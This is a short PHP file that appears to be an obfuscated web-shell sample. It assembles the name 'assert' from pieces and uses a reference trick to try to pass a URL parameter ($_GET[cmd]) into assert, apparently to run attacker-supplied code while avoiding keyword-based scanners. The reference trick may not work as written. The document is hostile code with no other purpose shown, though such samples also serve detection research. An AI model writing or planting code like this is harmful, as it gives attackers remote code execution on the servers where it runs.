<?php
class talker{
    public $data = 'Hi';
    public function get(){
        return $this->data;
    }
}

function foo(&$var)
{
    $var=$var.'t';
}

$aa = new talker();
$d = &$aa->get();
$d = $_GET[cmd];


$a="asser";
foo($a);
$a($aa->data);

?>

